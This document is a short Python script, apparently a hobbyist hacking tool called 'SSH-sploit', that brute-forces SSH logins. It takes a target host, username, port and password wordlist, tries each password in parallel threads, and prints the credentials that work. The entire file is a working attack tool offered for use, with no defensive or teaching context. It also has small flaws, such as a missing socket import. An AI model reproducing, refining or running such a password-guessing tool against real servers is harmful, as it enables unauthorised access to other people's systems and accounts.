import os
import time
import sys
import paramiko
import threading
from colorama import Fore
os.system('clear')
print(Fore.MAGENTA+'''

 __  __                        _       _ _   
/ _\/ _\  /\  /\     ___ _ __ | | ___ (_) |_ 
\ \ \ \  / /_/ /____/ __| '_ \| |/ _ \| | __|
_\ \_\ \/ __  /_____\__ \ |_) | | (_) | | |_ 
\__/\__/\/ /_/      |___/ .__/|_|\___/|_|\__|
                        |_|                  
Author    : king
GitHub    : theEmpireSec
Instagram : @the.empiresec\n''')
host = input(Fore.CYAN+'[+] Enter host/ip : ')
user = input(Fore.CYAN+'[+] Enter username : ')
pwdf = input(Fore.CYAN+'[+] Enter password file path : ')
port = int(input(Fore.CYAN+'[+] Enter port number : '))
if os.path.exists(pwdf) == False:
	print(Fore.RED+'[!] File does not exist :( ')
	sys.exit(0)
print(Fore.MAGENTA+f'''
HOST          : {host}
USERNAME      : {user}
PASSWORD_LIST : {pwdf}
PORT          : {port}
''')
rusure = input('press [ENTER] to continue')
flag = 0

def ssh_connect(password):
	global flag
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		ssh.connect(host ,port=port,username=user,password=password)
		flag = flag + 1
		print(f'[+] Combo Found\nHOST : {host}\nUSERNAME : {user}\n PASSWORD : {password}')
	except paramiko.AuthenticationException:
		print(Fore.RED+f'[!] Invalid password {password}')
	except paramiko.SSHException:
		print(Fore.RED+'Quota exceed try after sometime ')
		sys.exit(1)
	except socket.error:
		print(Fore.RED+'Can\'t connect to ssh server ')
	except:
		pass
	ssh.close()
paswd_file = open(pwdf,'r')
for password in paswd_file.readlines():
	password = password.strip()
	if flag == 1:
		t.join()
		exit()
	t = threading.Thread(target=ssh_connect,args=(password,))
	t.start()
	time.sleep(0.5)
